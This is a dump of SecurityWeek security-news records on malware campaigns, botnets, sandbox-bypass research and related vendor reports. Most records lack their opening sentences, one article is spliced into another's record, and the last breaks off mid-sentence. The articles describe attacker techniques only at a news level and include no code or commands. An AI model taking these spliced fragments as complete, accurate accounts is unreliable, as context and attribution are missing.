{ "_id" : { "$oid" : "5b27c5256cefc41c844ab449" }, "Category" : "Malware", "Title" : "Application Sandboxes Won't Stop Advanced Attacks: Research", "Address" : "https://www.securityweek.com/application-sandboxes-wont-stop-advanced-attacks-research", "Date" : "July 24, 2013", "Article" : "While application sandboxes can isolate threats and protect endpoints from certain types of malware attacks, there are fundamental issues in how they are designed, according to new research from Bromium.  Application sandboxes are useful for isolating certain threats and protecting the operating system from malware, but the protection is not robust enough against advanced or targeted malware targeting the operating system kernel, Rahul Kashyap, chief security architect and head of security research at Bromium, told SecurityWeek.   Kashyap outlined threat vectors sandboxes could not effectively block in a \"A Pen-Tester's Perspective\" whitepaper released on Tuesday. Kashyap was careful to point out that he was not saying sandboxes don't work, or that he was calling out certain vendors for their mistakes. Rather, his point was that sandboxes are often regarded as fail-proof and other security measures are often not implemented on the endpoint because there is a sandbox in place. Sandboxes work well for the job they were designed to do, but other security layers must be in place to handle other threats, Kashyap said.  \"People think, I have a sandbox, so I am completely protected,\" Kashyap said, and neglect other security steps such as regularly patching the operating system.  The report looked at sandbox technologies from Sandboxie (version 4.0.4), Bufferzone Pro (version 4.04-185), Dell Protected Workspace (powered by Invincea), and the built-in sandboxes in Google Chrome (version 27.0.1453.110 m) and Adobe Reader XI (version 11.0.3). Sandboxie, Bufferzone Pro, and Dell Protected Workspace successfully blocked off-the-shelf exploits. The researchers used the exploit module in Metasploit for CVE-2013-1347, the Internet Explorer vulnerability which was used in the Department of Labor watering hole attack earlier this year.  Bromium's goal was to highlight the attack surface for these application sandboxes. Most of the issues were due to architectural limitations and implementation assumptions, Kashyap said.  Bromium Labs grouped attacks into two categories, one that bypasses the sandbox entirely, and the other where exploits succeed without breaking out of the sandbox. The bypass techniques focused on exposing the Windows OS kernel and the sandbox itself. The other categories included post-exploitation scenarios, such as keylogging, remotely accessing the webcam and microphone, hijacking the contents of the clipboard, screen scraping, stealing files, and accessing network shares.  The sandbox \"makes an assumption that the OS kernel is safe,\" which means users will always be \"vulnerable to zero day attacks and need to always patch,\" the report found.  \"The Windows kernel presents a broad attack surface to a skilled attacker, and a successful exploit against the kernel will breach the sandbox,\" the report said. While the possibility of a kernel-based attack has been discussed in the past, Bromium researchers believe the attack vector \"should be considered as a very real threat, at least as likely to be exploited as other possible vectors.\" The researchers developed kernel-level exploits that bypassed the sandboxes for each of the tested products. It was easy to bypass the sandboxing software, but harder to do so in Chrome and Reader, Kashyap found.  Google had hardened the sandbox with additional security features such as restricting TCP/IP networking in case the renderer is compromised, which made it harder for the exploits to succeed.  There may be few vulnerabilities in the sandboxes, but plenty in the operating system kernel, Kashyap noted. Most malware authors haven't targeted the kernel yet—with the exception of Duqu—because it requires more skill, but Bromium believes it will be more actively exploited in the near future.  IT and network administrators should never rely solely on the sandbox—regardless of what kind or from which vendor—to protect the endpoint, Kashyap said. Other security best practices still apply. Administrators should continue to regularly patch Windows to address both user- and kernel-mode vulnerabilities.  Finally, no one should ever assume that it is safe to execute malware within a sandbox to see what it does, Kashyap warned. If the malware is sophisticated enough, it will be still be able to cause damage, he said. The full report from Bromium is available here in PDF format.

On Aug. 9, Microsoft accidentally released information on the five security updates it is planning to release tomorrow as part of this month’s Patch Tuesday. The information, which has since been taken down, represents a rare procedural slip-up in the company’s Patch process. Normally, Microsoft publishes an advanced notification the Thursday before Patch Tuesday – the second Tuesday of every month – and then posts no further information until the Patch Tuesday updates are released. This time though, information about the following security updates was posted live on the Web the day after the advanced notification: •\tMS011-070 Vulnerability in WINS could allow elevation of privilege •\tMS011-071 Vulnerability in Windows could allow remote code execution (DLL Linking Vuln.) •\tMS011-072 Arbitrary code execution vulnerability in Excel •\tMS011-073 Code execution vulnerability in Microsoft Office •\tMS011-074 Vulnerabilities in Microsoft SharePoint Could Allow Elevation of Privilege Typically, attackers try to reverse engineer the patches after the release, leading some people to dub the day after Patch Tuesday as “Exploit Wednesday.” However, since the patches themselves were not released, the impact of Microsoft’s gaffe may be minimal. In a statement, David Forstrom, director of Trustworthy Computing at Microsoft, said the draft text of the month’s bulletin summary was posted inadvertently, and was removed “as soon as the issue was discovered.” “We are not aware of any customer impact and we are monitoring the issue,” he said. The updates are slated to fix 15 separate vulnerabilities, and all are rated “Important”. The patches are scheduled to be released at 10 a.m. PDT Sept. 13. " }

Dubbed Morto, the worm doesn’t use a vulnerability, but instead propagates by compromising Remote Desktop connections on a network through brute forcing attacks. So far, the overall number of detections is relatively low - researchers at F-Secure put the number in the thousands – but reports of increased traffic on port 3389 prompted Microsoft to issue an advisory about the worm Aug. 28. “Once a new system is compromised, it connects to a remote server in order to download additional information and update its components,” blogged Hil Gradascevic, a researcher with Microsoft’s Malware Protection Center. “It also terminates processes for locally running security applications in order to ensure its activity continues uninterrupted. Affected users should note that a reboot may be required in order to complete the cleaning process.” While 74 percent of the computers known to be affected are running Windows XP, infections have also been found on Windows Vista, Windows 7 and Windows Server 2003 and 2008. In a separate blog post, Microsoft’s Holly Stewart and Matt McCormack noted Morto attempts to compromise more than just the 'Administrator' account when brute forcing RDP connections with a dictionary attack. It also tests the affected machine's Internet connectivity by attempting to connect to IP 74.125.71.104, an IP owned by a legitimate corporation and believed to be unrelated to malware. If unsuccessful, it then cycles through IP addresses on the affected computer's subnet and attempts to connect to targeted hosts using various usernames such as “admin” or “backup.” Mikko Hypponen, chief research officer at F-Secure, told SecurityWeek that companies looking to protect themselves should make sure their RDP servers are not exposed to public networks by accident. The next step is to ensure strong passwords are being used that can’t be cracked by a wordlist or reasonable brute force attack, he added. Marc Maiffret, CTO of eEye, described the worm as reminiscent of older worms such as Slammer and CodeRed, and contended that if “there are companies in this day and age being compromised by Morto, we have bigger problems to worry about than the “APT” or Stuxnet.” “You should never allow RDP access directly from the Internet, without, at the very least, requiring VPN authentication, before gaining access to corporate servers remotely,” he advised.

The botnet, which Trend Micro dubbed StealRat, uses a mix of compromised websites and machines as part of its operation.  \"In this set up, the actual spam server is hiding behind three layers of unsuspecting victims: two compromised websites and an infected machine,\" blogged Jessa De La Torre, threat response engineer at Trend Micro. \"The infected machine acts as a liaison between the spam server and the compromised website. As there is no interaction between the spam and server, it will appear the email have originated from the infected machine. The spam mail itself does not spread the malware, so there is no visible link between the two as well. In essence, they have separated the core functions and minimized interactions among them to cut-off any threads that could link them to each other.\" A compromised website has the payload link and a spamming script, De La Torre explained. Typically, the payload is porn or an online pharmacy webpage. The spamming script is coded in PHP and waits for data from an infected machine, which connects to the malicious spam server to collect the spam data. The spam data includes the sender name, recipient address, backup mail server and email template. \"Another interesting behavior is that it uses the compromised website’s domain as its email service domain,\" the researcher noted. \"For instance, if xyz.com is hosting the spamming script, the email will appear to have come from [sender name]@xyz.com.\" \"In a compromised system (infected machine), the malware component also exhibits some conspicuous traits,\" De La Torre continued. \"For instance, some variants attempt to cloak its network traffic by modifying the host name to google.com while receiving its instructions from its C&C server [command and control server]. If the C&C is example.com, instead of directly connecting to it, it queries for the domain’s mail server (eg. mx1.example.com) and connects there instead. The network traffic won’t show an established connection to either example.com or mx1.example.com, the hostname would appear to begoogle.com instead.\" During Trend Micro's investigation, the company identified 85,000 unique IPs/domains that sent out spam emails in one month; discovered that each IP/domain contains an average of two spamming scripts; discovered that each infected machines sends at least 8,640 spam data to compromised websites per day; and are currently rotating around seven million email addresses to send spam to. \"While exploiting vulnerable websites to send out spam has already been exhausted by other botnets, StealRat stood out because it used simple yet subtle methods to improve the botnet’s resiliency,\" the researcher blogged. \"Its operators set very clear boundaries. They used compromised sites to send out spam. They also made use of compromised machines but only as mediators between the compromised sites and the spam server.\" \"This allowed them to cover their tracks, as they left no clear evidence of a connection between the sites and their server. They also used legitimate mail servers and modified hosts to mask their traffic.\" \"This operation certainly proves that cybercriminals are always out looking for ways to evade the security defenses,\" De La Torre wrote.  " }

Fast forward to August 2011 – Google Chrome OS is a reality on the market and its security is on the menu at the annual Black Hat security conference in Las Vegas. In their presentation Aug. 3, Matt Johansen and Kyle Osborn of WhiteHat Security demonstrated how to compromise Chrome by targeting vulnerable Web extensions via cross-site scripting bugs that enable attackers to inject JavaScript into user machines by leveraging the permissions the extensions use. The presentation put a spotlight on the importance of secure extensions, particular for users of Google Chrome since the mobile operating system is designed to work exclusively with Web applications. Further complicating matters is an apparent lack of vetting of extensions available for Chrome OS – something demonstrated when the duo were able to successfully upload a malicious extension to the Chrome Web store. They took the extension down immediately. For its part, Google - which the researchers said was quick to fix a vulnerability the duo found in an extension bundled with Chrome called Scratchpad - issued a number of pieces of advice for people writing extensions improve security in the weeks before Black Hat. Among the tidbits: minimize your permissions and avoid including JavaScript in pages using a HTTP URL, with the latter opening the extension up to the possibility of man-in-the-middle attacks. The company also recommends not using the eval() function or innerHTML and document.write(). “It's important to point out that extensions running in Chrome have actually been designed to limit privileges and to run in isolation by default,” a Google spokesperson told SecurityWeek. “Incognito mode on Chrome OS and Chrome do not allow extensions unless they are explicitly whitelisted by the user.” The good news is that even if attackers manage to upload a malicious application to the Chrome Web store, they will likely have a hard time tricking large numbers of people into installing it, opined Chester Wisniewski, senior security advisor at Sophos Canada, in a blog post. “The worrying part is that any existing popular extensions which contain vulnerabilities could allow for an attacker to arbitrarily hijack everything that occurs in your browser session,” he wrote. “Scary.” " }

The threat is a file infector malware that is part of the PE_EXPIRO family; malware that Trend says was first discovered in 2010.  According to the security firm, several exploits are being used to infect systems through drive by download attacks on Web pages using an exploit kit as users browse the Web.   Exploits used in the attacks include two Java exploits which target CVE-2012-1723 and CVE-2013-1493, and an unnamed PDF exploit. Trend detects the malicious PDF file as TROJ_PIDIEF.JXM.  All of the exploits result (if the attack is successful) in file infector malware infecting systems with PE_EXPIRO.JX-O, PE_EXPIRO.QW-O, or PE64-EXPIRO-O for 64-bit systems.  These file infectors include information theft routines, something Trend reminded is not typical behavior found among file infectors.  After a system is infected, the threats search all available storage drives (including network drives) for .EXE files to infect. The malware then captures system and user information, including Windows product ID, drive volume serial number, Windows version and user login credentials.   The malware also steals stored FTP credentials from Filezilla, a popular FTP client.  “It is possible that this attack was intended to steal information from organizations or to compromise websites, as the specific targeting of FTP credentials suggests either was possible,” Rhena Inocencio, a Threat Response Engineer) at Trend Micro explained in a blog post. The stolen information is saved in a .DLL file and uploaded to command-and-control (C&C) servers.  “The combination of threats used is highly unusual and suggests that this attack was not an off-the-shelf attack that used readily available cybercrime tools,” Inocencio added.  Roughly 70% of the total infections detected by Trend Micro were found in the United States.

For some, this has reignited discussions about how the security of Apple’s Mac OS X stacks up against Microsoft Windows. Mac computers have, after all, traditionally been relatively free of malware when compared to Windows-based PCs. But a presentation today at the Black Hat security conference in Las Vegas made it clear the answer to the question is not clear cut. Both platforms have their pros and cons, explained Alex Stamos, co-founder of IT security consultancy iSEC Partners, but when it comes to APT, the Mac’s defenses are weak at a key phase of these types of cyber-assaults. Once attackers are on the network, they can take advantage of weak authentication schemes used by many of Apple’s server protocols to escalate privileges and wreak havoc, he argued. Network privilege escalation is at the heart of APT, Stamos said, particularly because any organization with thousands of people has at least one employee “dumb enough” to be duped into running malware. As recent the breach at EMC’s RSA security division showed, all it takes is a piece of malicious software and the right amount of social engineering to successfully execute an attack. The step - where attackers on the network seek to obtain higher privileges - is the step that “you can monitor; the step you can harden,” Stamos said. “But unfortunately on Mac, it’s also the step that’s pretty much trivial for attackers.” Apple did not respond to a request for comment about the presentation. However, Stamos and fellow iSEC presenters Paul Youn and William “B.J.” Orvis pointed out that Apple has made some efforts to bolster protections for its operating system in recent years. Among them, the introduction of data execution prevention (DEP) in 2006 as well as the improved implementation of address space layout randomization (ASLR) in Mac OS X 10.7. When it comes to these features, as well as technologies meant to prevent local privilege escalation, Mac OS X 10.7 is on par with Windows 7 in the fight against APTs, Stamos contended. Some of the challenges facing Mac users however may be less technical and more psychological. For example, Apple users have been conditioned to think of themselves as safe, and are therefore less likely to run antivirus and more likely to run applications that are unsigned, argued Youn, senior security consultant with iSEC. In addition, attackers in an APT scenario are “looking for a user who doesn’t have the strongest appreciation for security,” Youn said. The trio’s presentations comes on the heels of a new report from RSA, contending APTs are now targeting a broad range of private sector organizations to steal intellectual property and other proprietary data. \"Cyber criminals have aggressively shifted their targets and tactics,\" said Art Coviello, executive chairman of RSA, in a statement announcing the release of the report earlier this week. \"In the never-ending war for control of the network, the battle must be fought on many different fronts. All organizations are part of the greater ecosystem of information exchange and it is everyone's responsibility to build and protect that exchange.\" " }

The attack uses right-to-left override [RLO], a special character used in bi-directional text encoding system to mark the start of text that are to be displayed from right to left, explained Broderick Aquilino, an F-Secure Labs Analyst. RLO is commonly used by Windows malware such as Bredolab and was also used by the high-profile Mahdi Trojan discovered last year as a means of hiding the actual extension of executable files, he blogged. \"[The objective] here it's simply to hide the real extension,\" he continued. \"The malware could have just used \"Recent New.pdf.app\". However OS X has already considered this and displays the real extension as a precaution.\" According to F-Secure, the malware continuously takes screen shots and records audio before uploading the data to a command and control servers. It also polls the C&C constantly for commands to execute. \"The malware is written in Python and it uses py2app for distribution,\" Aquilino blogged. \"Just like Hackback, it's signed with an Apple Developer ID.\" However, because of the RLO character, the usual file quarantine notification from OS X will be backwards, he added. The malware drops and opens a decoy document when it is executed, then creates a cron job for its launch point and a hidden folder in the home directory of the infected user to store its components. To obtain the address of its command and control server, the malware connects to certain YouTube pages and parses for the address in the string \"just something i made up for fun, check out my website at (address) bye bye.\" The malware is detected by F-Secure as Backdoor:Python/Janicab.A.  " }

Once Vobfus has infected the computer, it then downloads Beebone, a downloader Trojan capable of downloading other types of malware, including Vobfus, Zbot, Sirefef, Fareit, Nedsym, and Cutwail. Beebone also communicates with a remote command-and-control server to join the computer to a botnet.  Beebone downloads additional Vobfus variants, usually brand-new ones that security tools don't recognize yet, creating a \"cyclical relationship,\" Choi said. Even if Vobfus is detected and removed, it would have already downloaded Beebone by then. And Beebon can continue to download Vobfus variants, making it difficult to eradicate Vobfus entirely.  This is why Vobfus \"may seem so resilient to antivirus products,\" Choi said.  Most malware with self-updating mechanisms can be eradicated because once removed from the system, they cannot download newer versions to re-infect the machine. With Vobfus, so long as it keeps downloading versions of Beebone that antivirus and other security tools don't recognize, the cycle of infection will continue.  Because Beebone downloads multiple malware families, the \"cumulative side-effects\" are present in the compromised machine, making the cleanup process even more challenging.  In a network environment with lots of mapped network usage or data -sharing via removable drives, Vobfus spreads by copying itself and an autorun.inf onto new locations, Choi said. It also creates a runkey in the system registry to ensure it runs every time Windows starts.  \"In the wild, we have observed that Vobfus maintains a very successful removable-drive infection rate, thus supporting its spreading,\" Choi said.  With Beebone on the computer, thieves gain remote control of the machine to send spam or launch other attacks against other machines. The malware also has data-collection capabilities and may look for specific pieces of information that are transferred to remote servers and sold on the underground market, Choi said.  Administrators should have the operating system and all installed software up-to-date. They should also make sure the \"autorun\" feature is disabled on Windows machines so that Vobfus can't use that method when an infected USB drive is attached to the computer. Since Vobfus sometimes use drive-by-download links as an infection vector, users need to be cautious about what links they are clicking on, Choi said. It's also important to make sure the antivirus tools are regularly updated to detect the latest malware versions right away. " }

With all these high profile breaches, one thing that may have fallen out of the spotlight is the massive volume of malware being created and spread on a daily basis. In Q2 2011, malware continued to spread substantially, with 42 new malware strains being created every minute (about 60,000 per day), according to PandaLabs. According its Quarterly Report for Q2 2011, which analyzed IT security events and incidents from April through June 2011, PandaLabs, the anti-malware lab at Panda Security, says Trojans were responsible for 69 percent of infections, followed by viruses (10 percent) and worms (8.53 percent). Adware, which only represents 1.37 percent of all malware, accounted for more than 9 percent of all the infections, indicating the substantial effort malware writers are taking to promote this type of malicious code. Fake anti-virus programs, which are included in the adware category, have also continued to grow. According to PandaLabs, this shows the interest and the amount of work put in by cybercriminals to ‘promote’ these tools. From a pure cost-benefit perspective this is quite easy to understand, as once cybercriminals spread their fake antivirus software, all they have to do is wait for users to start sending them money. In terms of countries with the highest levels of malware infections, China, Thailand and Taiwan took the top three spots again. In terms of the lowest, PandaLabs says Sweden, Switzerland and Norway were the least infected countries across its user base. The quarter brought the first large-scale attack on the Mac platform through “rogueware” or fake antivirus software called MacDefender and other variants like MacShield. In the mobile sector, the number of attacks on Google’s Android platforms has continued to rise. The full Quarterly Report for Q2 from PandaLabs is available here  " }

The victims are spread out between local government entities to companies operating in the telecom, IT, natural resources and travel industries. The goal of the attack appears to be to steal user credentials for a number of sites as well as IT systems such as firewall and customer relationship management (CRM) systems. \"The executable that was sent with the email was called emiratesstatement.exe and the pictogram of the executable tried to impersonate itself as a PDF,\" blogged Christiaan Beek, director of Incident Response and Forensics for the McAfee Foundstone team in Europe, the Middle East and Africa. The key components of the malware include Msnd.exe, a keylogger writing the output to a TMP file; Image.exe, a mail password recovery tool written by SecurityXploded; and Picture viewer.exe, a browser password recovery tool also written by SecurityXploded. \"The malware tries two options to install itself: installing the msnd keylogger and activating the password recovery tools [and] opening the pid.PDF file,\" he explained. \"This PDF will open a PDF reader and the malware will inject itself into this process and activate the password-recovery tools.\" During the malware’s installation, it disables the Windows firewall by using two simple .bat scripts. After gathering all the recovered passwords and writing them to output files, these files are converted to files starting with the prefix PIC – followed by the date/time and a numerical indicator, Beek wrote. After these files are created, an FTP session transfers the files to an FTP server. The credentials the criminals were after included among other things login information for Facebook, Hotmail, news sites, travel reservation systems and e-services for government institutions. Beek did not say how many victims were compromised in the attack. To prevent these kinds of attacks users should not click on files attached to an email that are sent by unknown persons, block emails at the email gateway/mail server that contain an executable file and use a spam filter that regularly imports up-to-date threat intelligence, Beek advised.

According to Kaspersky’s data, Russia overtook the United States, where the quantity of malware infected emails received fell by 3.5 percent. The most widespread malware distributed via email was the Trojan-Spy program Trojan-Spy.HTML.Fraud.gen. Worms like Email-Worm.Win32.Mydoom.m, Email-Worm.Win32.Bagle.gt and Email-Worm.Win32.NetSky.q all remained high in the ratings, while newcomers included two Trojan-Downloader.Win32.FraudLoad Trojans. Symantec, in its May 2011 Intelligence Report showed that as the overall spam level increased in May 2011, Russia became the most spammed geography, with a spam rate of 82.2%, but marked the UK as the country with the highest virus rate in emails at a rate of 1 in 91.7. Why the disparity? Due to Kaspersky Lab’s large footprint in Russia (Kaspersky Lab is a Moscow based company), it has a large marketshare compared to other regions of the world, and is thus likely seeing more activity across its customer base in the region. Experiencing 38% worldwide growth from 2009 to 2010, Kaspersky Lab generated 66 percent of its revenue from Europe and EEMEA. According to Kaspersky Lab, in May, spammers tapped hot topics in the news to deceive users. In particular, Kaspersky notes, a surge in the number of messages exploiting the news of the death of Osama bin Laden was seen. The most marked changes took place in the ratings of web services attacked the most with the use of phishing emails. 4.67 per cent of all phishing emails were intended to steal passwords for the popular free online game RuneScape. As a result, this platform made its debut in the top-ten straight in at No. 3 - way ahead of World of Warcraft - the most popular online game in the world. RuneScape is also of interest to cybercriminals, as it has access to user details of the popular social networking site, Facebook. The overall leader in the rating remained the payment system PayPal, which saw a small rise in the number of phishing emails (23.28 per cent on the figure for April 2011). The full version of the Kaspersky Lab spam activity report for May 2011 is available here. " }

In response to a recent Maine US District Court’s ruling that Ocean Bank is not liable for $300,000 stolen by hackers from a Construction Company’s online banking account, Smith believes it is important to have a tax incentives in place to further encourage users to make investments in securing themselves online. These battles and disputes are far from new. In one incident in 2009, Dallas based PlainsCapital Bank actually filed suit against one of its clients, Hillary Machinery, after a series of fraudulent ACH transactions siphoned $801,495 from the company’s bank account. While the bank managed to get back about $600,000 of the funds, Hillary requested that the bank refund the remaining $200,000. PlainsCapital responded by filing a lawsuit against the company. The two sides ended up working out an undisclosed settlement. In the Ocean Bank case, the judge asserted it was Patco’s responsibility to protect account credentials – mainly by using Internet security and identity protection tools. AVG’s Smith thinks the decision represents a critical shift in liability of the industry’s willingness to absorb the skyrocketing costs of identity theft and online fraud. “AVG has long predicted that banks and retailers would reach a tipping point where they could no longer fully cover losses that are incurred as a result of small businesses and consumers not taking responsibility for securing their personal information,” said Smith. “More than two years ago AVG began asking governments to consider tax incentives for consumers and small businesses as a way of helping them understand their role in securing the World Wide Web. We believe the money ultimately saved by thwarting online attacks could not only offset, but supersede the revenues lost in a tax incentive.” Smith would not be surprised if the Maine decision is soon joined by others that take the side of the retailer and banks who have long covered for their customers’ inattention to security threats. “Banks and retailers are going to expect small businesses and consumers to meet them halfway when it comes to security,” said Smith. “AVG believes that tax incentives for small businesses and consumers are important steps in the process of helping them understand they are a critical link in the security chain. Because consumers and small businesses really do not have a choice when it comes to doing business in the digital world, and as business and government are completely dependent on the worldwide web to conduct commerce, it is important they have tax incentives to make the right security investments.” Furthermore, AVG’s recent SMB landscape report found that one in seven small businesses have no security software (rising to one in four for single-employee businesses in the US) – and less than half are aware of the real and tangible threats posed by Internet based attacks. AVG also found that 77 percent of firms recognize that a security breach could have a significant impact on their business and 83 percent feel that having the right level of protection is critical to their business. Yet less than half have a clear security policy in place. Obviously, AVG and other security vendors would have much to gain in a scenario where tax incentives were put in place for consumers and businesses to utilize security software. The auto-industry, while it still struggled overall, benefited immensely from government bailouts and consumer tax incentives for buying environmentally friendly vehicles. Why not the IT security industry? As the governments of the world work to establish the right balance between control and freedom for citizens online, it has proven to be a double-edged sword. There are many controversies surrounding online privacy and the government’s role in securing citizens online, so could a tax incentive program like this be a good way to encourage people to increase their individual security posture while not compromising on the privacy side?

The attacks occurred Tuesday on the anniversary of the start of the Korean War in 1950, an event the hackers effectively commemorated by taking down websites for the South Korean president's office as well as local newspapers. While government officials have not blamed anyone for the attacks, Symantec believes a group called DarkSeoul is responsible for at least one of the attacks and has been actively targeting South Korea for four years. The group is believed to be tied to attacks there in March as well, when numerous hard drives at South Korean banks and television stations were wiped in a spate of devastating attacks. Symantec also blames the crew for attacks on financial companies in South Korea last month. \"Previously, we believed that these attacks were all connected based on the M.O., but that is not definitive enough for us to declare they are indeed connected,\" said Eric Chien, technical director for Symantec's Security Response team. \"The attack this week, however, used new binaries. These new binaries shared code with the previous attacks that allowed us to definitively connect all the attacks together. The shared code is not code we have seen used in any other attacks, either.\" According to Symantec, the gang's attack begins with a user visiting a compromised site hosting the Trojan downloader Castov disguised as SimDisk.exe. Ultimately, the infected computer also downloads a Trojan known as Castdos, which is used for the DDoS attack. Trend Micro Threats Researcher Marco Dela Vega blogged that the malware connected to the DDoS attack was set to drop the DDoS-capable component into systems on or after 10 a.m. June 25 with the goal of triggering a ticking time bomb. \"Looking more into the attack, maximum impact appears to be its primary goal,\" he wrote. \"The DDoS attack is carried out by repeatedly sending relatively large DNS packets (more than one kilobyte) to two IP addresses. These targeted IP addresses are the primary and secondary DNS name servers of record for multiple South Korean government sites. The attack is intended to knock all of these sites offline indirectly: users that don’t have a DNS record cached for these domains would need to use DNS to translate the domain name to the IP address, but because the name servers for these domains are offline, they would be unable to do so.\" \"By targeting a single point of failure, attackers are able to take down multiple sites using only one attack,\" he added. In addition to taking the sites down, a report surfaced today that hackers had both obtained and publicized personal details of more than two million South Korean ruling party workers and 40,000 U.S. troops, including those stationed in South Korea. \"We have seen the sites where the details were posted and clips that supposedly capture the process of hacking into web sites,\" an official at the South Korean online security firm NSHC told Reuters. The legitimacy of the information however could not be verified, the official said. " }

Damballa CSP 1.6, identifies cyber threat activity on any type of subscriber device including PC, Mac, iPad, iPhone, Android and all mobile and smartphone platforms by monitoring a carrier’s DNS activity for malicious network traffic. Designed to handle the massive scaling requirements of large carrier environments, Damballa’s solution can automatically detect and correlate subscriber infections with threats that can be remediated using Microsoft’s anti-malware technology. Combined with in-browser notification, redirection, and/or ‘walled garden’ technologies, customers can be notified by their internet service provider (ISP) of a threat and directed to the Microsoft Safety Scanner, allowing the subscriber to remove the infections. ISPs and telcos are facing increasing pressure to provide ‘clean pipes’ and to protect their subscribers from cybercrime that threatens to steal customer credentials, commit fraudulent transactions, or commandeer the subscriber device to launch DDoS or other cyber attacks. “Network abuse is a primary concern for all carriers today,” said Jennifer Pigg, vice president of network research, Yankee Group. “Subscriber infections not only create a poor customer experience, but they increase the cost of carrier operations due to the massive effort required to identify the source and cause of network abuse. And ultimately, the infections can lead to the carrier having to respond to inquiries and allegations of abuse emanating from their network.” Damballa CSP 1.6 introduces a number of new capabilities including: •\tIdentification of Threat Intent - With Damballa CSP 1.6, attribution is provided for the subscriber infection indicating the criminal intent. Threat Intent types include Downloader, Multi-Purpose, DDoS, Information Stealer, Exploit Kit, etc. •\tDescription of Threat  Threat Details - Now provide intelligence regarding what is known about the criminal operator including Threat Behavior, Malware Names, Observed Traits and Capabilities. •\tHP ArcSight Common Event Format (CEF) Certification -  Many carriers are using the ArcSight Enterprise Threat and Risk Management (ETRM) platform for monitoring and managing their security events. With certification of Damballa CSP with the ArcSight platform, the integrated solution can now automate the correlation of infected IP addresses to the subscriber account, completing an important step of the detection-notification-remediation process. •\tIntegration Partnership with PerfTech -  PerfTech is a provider of in-browser notification solutions. Once Damballa CSP detects the threat and it is correlated with the subscriber account, a customized notification can be generated alerting the subscriber to the infection and providing next steps for remediation, even directing them to the ISP’s security portal for remediation assistance. •\tCorrelation of Threat Intelligence with Microsoft Remediation Solutions - Damballa CSP 1.6 provides Threat Intelligence about the subscriber infection and is then correlated with the threats that can be remediated using Microsoft’s anti-malware technology like Safety Scanner. “With Damballa CSP 1.6 and our growing list of integration partners, we can deliver a light-weight, highly scalable end-to-end solution that automates detection, correlation and remediation of the subscriber infection,” said Stephen Newman, vice president of product management for Damballa. “Most carriers are just beginning to build out their cyber threat detection and remediation solutions. With this collaboration of best-of-breed technologies, ISPs and Telcos can be up and running quickly with a highly automated solution for identifying and removing network abuse caused by advanced malware and subscriber devices under criminal command-and-control.” " }

The study, co-commissioned by online advertising technology companies, AdKeeper and 24/7 Real Media, revealed that over half of users don’t click online ads because they are afraid of receiving spam from advertisers or worried about getting a virus. The study, sought to explain the 2010 industry average click-through rate (CTR) of 0.09 percent for online advertising, was conducted by Nielsen over a 5-day period beginning on March 4, 2011 among 600 randomly selected adult U.S. residents aged 18 to 54 who hardly ever or never click online banner advertisements. According to the results, the top reason people don’t click banner advertisements was because they don't want to be taken away from their current online activity. Reasons why respondents say they don’t click online advertisements: •\t55 percent – are worried about getting a virus. •\t57 percent – are afraid of receiving spam from advertisers. •\t31 percent are worried that their Internet behavior will be tracked. •\t58 percent say online banner ads are not that relevant to them. •\t54 percent – don’t trust most online banner ads they see. •\t46 percent – worry that pop-ups will take over their screen. •\t43 percent say online banner ads don’t seem interesting or engaging. •\t31 percent only want to click ads when they’re in the mood or interested in looking at them. •\t61 percent don’t want to be distracted As frustrating as this may be for marketers, consumers may have some solid reasoning for their concerns. According to Dasient, a firm that helps discover and combat Web-based malware, “malvertising,” a method used to distribute malware via ad tags served through a publisher’s Web site, saw a significant spike in Q4 2010. Dasient estimated that in the last quarter of 2010 there was a 25% increase in malvertising ad impressions based on the same set of networks it monitored in Q3. According to estimates from Dasient’s Q4 Malware Update, 1.1 Million Web sites were infected with malware in Q4 2010. A recent incident when The London Stock Exchange Web Site served ads from an ad network that had been serving malicious ads, resulted in the site being flagged by google as malicious, showing the damage that can be done to a brand as a result. While the London Stock Exchange didn’t technically serve malware, it was serving ads from servers that were, which caused it to be flagged as a threat to most users attempting to visit the site. “Click-through rates for online ads are unacceptably low, which helps explain the disparity between online spending and time spent online by consumers,” said Scott Kurnit, Founder, Chairman and CEO of AdKeeper. “Advertisers spend only 15 percent of their budgets online, while consumers spend 28 percent of their media time on the Internet. This is the first study to ask why consumers don’t click on ads and shows the importance of allowing consumers to control their interaction with online ads, making them useable content, not interruptions.” " }

According to Trend Micro, a new Pushdo variant analyzed by the company's researchers sends out numerous HTTP requests, only some of which are requests to the real C&C server. The rest are meant to serve as distractions, Trend Micro Threat Researcher Spencer Hsieh in a blog post. \"The malware sample we analyzed contains an encrypted list of 200 domains,\" he blogged. \"It randomly chooses 20 among them and requests either the root path or the path of “?ptrxcz_[random]”. Some of these domains belong to large companies or famous educational institutions, while some are obscure websites. This makes C&C server identification using network traffic analysis more difficult as it can be tough to distinguish real C&C connections among the fake ones.\" \"Another by-product of this fake C&C feature is the potential distributed denial-of-denial (DDoS) the malware can initiate against the 200 web servers on the list,\" he added. \"Though the true intention is not to execute this attack, the huge of number of useless requests eats up a lot of bandwidth of these websites.\" The fake C&C feature also challenges the automatic sandbox system used by researchers for malware analysis. Before adding a server into the C&C blacklist, a system needs to check the whitelist first, the Trend Micro researcher noted. This will help avoid false positives. The feature offers a defense mechanism of sorts for Pushdo, which has been disrupted more than once in the past by takedown operations. The response of its creators has been to toughen the malware up. Earlier this year for example, researchers at Damballa and Dell SecureWorks also noted that Pushdo was using RSA encryption to make it harder for researchers to identify traffic, and added domain generation algorithms to dynamically generate domain names. \"If you are a potential attacker, the best way to not get caught is to blend your communications with normal/legitimate traffic and appear as inconspicuous as possible,\" he wrote. \"Pushdo creators understand this and adopted this strategy into their latest malware.\" " }

The botnet, know as “Coreflood,” is believed to have been operating for nearly a decade and to have infected more than two million computers globally throughout its existence. The Department of Justice and FBI on Tuesday announced the filing of a civil complaint, the execution of criminal seizure warrants, and the issuance of a temporary restraining order as part of what it says is the most complete and comprehensive enforcement action ever taken by U.S authorities to disable an international botnet. After installing itself by exploiting a vulnerability on computers running Windows, Coreflood steals private personal and financial information from unsuspecting victims, including users on corporate computer networks, and using that information to steal funds. In the enforcement actions announced on Tuesday, the DOJ and FBI shared some of their success: •\tFive Command & Control Servers that remotely controlled hundreds of thousands of infected computers were seized. •\t29 domain names used by the Coreflood botnet to communicate with Command & Control servers were seized. •\tAuthorities replaced the Command & Control servers with other “good” servers to prevent Coreflood from causing further damage to infected computers and other third parties. Additionally, U.S. Attorney’s Office for the District of Connecticut filed a civil complaint against 13 “John Doe” defendants, alleging that the defendants engaged in wire fraud, bank fraud and illegal interception of electronic communications. In addition, search warrants were obtained for computer servers throughout the country. In a move that hasn’t been done before as far as we know, the government was able to obtain a 